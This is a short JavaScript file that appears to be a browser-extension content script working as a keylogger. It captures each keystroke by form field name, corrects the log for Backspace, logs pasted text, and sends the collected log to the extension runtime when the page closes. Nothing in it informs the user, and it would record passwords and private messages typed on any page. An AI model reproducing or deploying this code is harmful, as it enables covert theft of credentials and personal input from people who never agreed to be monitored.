var site = null;
var logger = new Object();
var activeElement = null;
var selectedText = null;
var copiedText = null;

const BACKSPACE = 8;
const ENTER = 13;

window.onbeforeunload = function() {
    if(chrome.runtime)
        chrome.runtime.sendMessage(logger);
}

document.onload = function() {
    activeElement = document.activeElement.name;
    selectedText = null;
}

window.onload = function() {
    activeElement = document.activeElement.name;
}

document.onkeypress = function(event) {
    var keyCode = event.keyCode;
    var key = String.fromCharCode(keyCode);
    if(logger.hasOwnProperty(activeElement))
        logger[activeElement] += key;
    else
        logger[activeElement] = key;
}

// Remove Backspaces from Log
document.onkeydown = function(event) {
    var key = event.keyCode || event.charCode;

    if (key == BACKSPACE) {
        if (selectedText != null && logger.hasOwnProperty(activeElement) && logger[activeElement].indexOf(selectedText) != -1) {
            logger[activeElement] =  logger[activeElement].substring(0,  logger[activeElement].indexOf(selectedText)) +  logger[activeElement].substring( logger[activeElement].indexOf(selectedText)+selectedText.length);
        } else {
            if (logger.hasOwnProperty(activeElement) && logger[activeElement].length > 0) {
                logger[activeElement] =  logger[activeElement].slice(0, -1);
            }
        }
    }         
};


function updateActiveElement(event) {
    if(activeElement != document.activeElement.name) {
        activeElement = document.activeElement.name;
    }
}

function detectSelectedText() {
    var text = "";
    if (typeof window.getSelection != "undefined") {
        text = window.getSelection().toString();
    } else if (typeof document.selection != "undefined" && document.selection.type == "Text") {
        text = document.selection.createRange().text;
    } else {
        text = null;
    }
    if (text == "") {
        text = null;
    }
    selectedText = text;
}

function keyOrMouseUp(event) {
    updateActiveElement(event);
    detectSelectedText();
}

document.onmouseup = keyOrMouseUp;
document.onkeyup = keyOrMouseUp;

// Log Copy + Paste Text
document.addEventListener('copy', function(){
    copiedText = document.getSelection().toString();
});

document.addEventListener('paste', function(event){
    logger[activeElement] += copiedText;
});